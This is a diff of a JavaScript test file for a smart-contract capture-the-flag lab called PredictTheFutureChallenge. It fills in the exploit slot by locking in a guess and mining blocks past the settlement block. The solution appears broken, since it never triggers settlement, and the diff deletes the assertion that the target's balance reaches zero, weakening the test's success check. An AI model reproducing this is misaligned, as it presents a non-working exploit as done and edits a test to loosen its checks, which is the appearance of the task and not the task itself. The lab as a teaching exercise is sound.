@@ -24,11 +24,19 @@ describe('PredictTheFutureChallenge', () => {
   });
 
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
+    
+    const currentBlock = await provider.getBlockNumber();  
+    await target.lockInGuess(0, { value: utils.parseEther('1') });  
+    
+    // Settlement happens at currentBlock + 2  
+    const settleBlock = currentBlock + 2;  
+    
+    // Mine blocks until we pass it  
+    while ((await provider.getBlockNumber()) < settleBlock) {  
+      await ethers.provider.send('evm_mine', []);  
+    }  
 
-    expect(await provider.getBalance(target.address)).to.equal(0);
     expect(await target.isComplete()).to.equal(true);
   });
 });
+
